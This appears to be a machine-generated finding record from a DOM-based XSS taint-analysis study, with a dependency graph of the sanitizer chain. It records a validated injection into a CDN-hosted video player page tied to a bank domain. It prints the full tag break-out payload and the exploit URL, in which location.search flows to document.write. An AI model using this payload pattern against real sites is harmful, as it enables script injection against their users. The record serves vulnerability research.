@@ -1,0 +1,92 @@
+// Finding: 4dc014d8-e895-463d-9cae-b6be2f03a6e0
+// Finding.url: https://eqa132ndue.eq.webcdn.example155.com/www50/eqa132ndue/jmc_pub/jmc_swf/player/player_3_2_0/onetag_t3.html?b=eqa132ndue.eq.webcdn.example155.com/www50/eqa132ndue/jmc_pub"></iframe></style></script></object></embed></textarea><script>taintfoxLog('d01f1a4431c346259d760f49d5b522b9')</script><!--/*/jmc_swf/player/&c=NDE1&m=NDE1&s={hp: 360,il: off,rb: off,rp: fit,sn: f,t,m,g,ti: off,wp: 640}&eqplcid=bImmTGeBDU6uZhzqghycEWJJEfJF8vM3&eqplsid=pMaN676hkvtKVyf7UdstjQzqa5Au9o8a&default_quality=2&parent_url=https://www.shinseibank.com/powerflex/shintaku/&domain=https://www.shinseibank.com/powerflex/shintaku/?intcid=top_pdt_000_33&CookieDomain=.shinseibank.com&useShortcutKey=on&tagType=player_3_2_0
+// Finding.parentloc: https://eqa132ndue.eq.webcdn.example155.com/www50/eqa132ndue/jmc_pub/jmc_swf/player/player_3_2_0/onetag_t3.html?b=eqa132ndue.eq.webcdn.example155.com/www50/eqa132ndue/jmc_pub"></iframe></style></script></object></embed></textarea><script>taintfoxLog('d01f1a4431c346259d760f49d5b522b9')</script><!--/*/jmc_swf/player/&c=NDE1&m=NDE1&s={hp: 360,il: off,rb: off,rp: fit,sn: f,t,m,g,ti: off,wp: 640}&eqplcid=bImmTGeBDU6uZhzqghycEWJJEfJF8vM3&eqplsid=pMaN676hkvtKVyf7UdstjQzqa5Au9o8a&default_quality=2&parent_url=https://www.shinseibank.com/powerflex/shintaku/&domain=https://www.shinseibank.com/powerflex/shintaku/?intcid=top_pdt_000_33&CookieDomain=.shinseibank.com&useShortcutKey=on&tagType=player_3_2_0
+// Finding.domain: eqa132ndue.eq.webcdn.example155.com
+// Finding.base_domain: example155.com
+// Finding.source: location.search
+// Finding.sink: document.write
+// Sanitizer.score: 1
+// Sanitizer.name: <synthetic>
+// Sanitizer.location: example18.com
+// Finding.begin: 101
+// Finding.end: 108
+// Finding.original_uuid: 4d14faa2-2aaf-495b-a6c7-4f7eaeeb88fd
+// Finding.TwentyFiveMillionFlowsId: -1173928792
+// Finding.script: https://eqa132ndue.eq.webcdn.example155.com/www50/eqa132ndue/jmc_pub/jmc_swf/player/t3/inner.js
+// Finding.line: 1
+// Exploit.uuid: d01f1a44-31c3-4625-9d76-0f49d5b522b9
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: link
+// Exploit.break_out: jmc_pub"></iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: jmc_pub"></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 163
+// Exploit.end_taint_url: 170
+// Exploit.replace_begin_url: 163
+// Exploit.replace_end_url: 170
+// Exploit.replace_begin_param: 81
+// Exploit.replace_end_param: 88
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: true
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1272535491
+// DepGraph.sanitizer_hash: -538806443
+// Merged split and join statements 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 1"];
+n4 [shape=ellipse, label="split"];
+n5 [shape=box, label="Lit: &"];
+n6 [shape=box, label="Var: x"];
+n7 [shape=ellipse, label="split"];
+n8 [shape=box, label="Lit: ="];
+n9 [shape=box, label="Var: x"];
+n10 [shape=ellipse, label="decodeURIComponent"];
+n11 [shape=box, label="Var: x"];
+n12 [shape=ellipse, label="preg_replace"];
+n13 [shape=box, label="RegExp: /\//"];
+n14 [shape=box, label="Lit: /"];
+n15 [shape=box, label="Var: x"];
+n16 [shape=box, label="Var: x"];
+n17 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n6 -> n1;
+n4 -> n5;
+n4 -> n6;
+n9 -> n4;
+n7 -> n8;
+n7 -> n9;
+n11 -> n7;
+n10 -> n11;
+n15 -> n10;
+n12 -> n13;
+n12 -> n14;
+n12 -> n15;
+n16 -> n12;
+n17 -> n16;
+}
